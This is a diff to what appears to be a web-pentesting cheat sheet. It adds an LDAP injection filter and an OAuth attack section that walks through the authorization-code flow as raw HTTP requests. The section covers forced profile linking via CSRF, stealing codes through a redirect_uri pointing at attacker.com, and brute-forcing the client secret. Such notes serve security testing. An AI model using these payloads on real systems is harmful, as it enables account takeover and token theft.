@@ -473,10 +473,94 @@ https://raw.githubusercontent.com/payloadbox/sql-injection-payload-list/master/I
 
 objectClass=*
 
+(&(sn=administrator)(password=*))
+  
+### Docs
+  
 https://tldp.org/HOWTO/archived/LDAP-Implementation-HOWTO/schemas.html
+  
+https://book.hacktricks.xyz/pentesting-web/ldap-injection
 
-cn=user&disp=description
+## Attacking oAuth
+ 
+### Workflow OAuth Authorization code grant type
 
+1- 
+  
+GET /authorization?client_id=\<client_id>&redirect_uri=https://site.com/callback&response_type=code&scope=openid%20profile%20email HTTP/1.1
+  
+Host: site.com
+
+2-
+  
+GET /callback?code=\<code> HTTP/1.1
+  
+Host: site.com
+  
+Vulnerability Forced OAuth profile linking
+  
+-> CSRF
+  
+/codes/csrf/csrf_oauth.html
+  
+Vulnerability Code Stealing
+
+-> Open Redirect (redirect_uri)
+  
+https://site.com/authorization?client_id=<client_id>&redirect_uri=http://attacker.com/callback&response_type=code&scope=openid%20profile%20email
+  
+3-
+
+POST /token HTTP/1.1
+  
+Host: oauth.server.com
+
+client_id=<client_id>&client_secret=<client_secret>&redirect_uri=https://site.com/callback&grant_type=authorization_code&code=<code>
+  
+Vulnerability Brute-Force the Client Secret
+
+->
+  
+POST /token
+  
+content-type: application/x-www-form-urlencoded
+  
+host: site.com
+  
+client_id=\<client_id>&client_secret=\<BRUTE_FORCE>&redirect_uri=http%3A%2F%2Fip%2Fcallback&grant_type=authorization_code&code=<code>
+  
+4-
+  
+{
+  
+    "access_token": "<access_token>",
+  
+    "token_type": "Bearer",
+  
+    "expires_in": 3600,
+  
+    "scope": "openid profile"
+  
+}
+  
+5-
+  
+GET /userinfo HTTP/1.1
+  
+Host: oauth.server.com
+  
+Authorization: Bearer \<token>
+
+6- 
+  
+{
+  
+    "username":"user",
+  
+    "email":"user@ok.com"
+  
+}
+    
 ## Padding Oracle Attack
   
 ### Identify
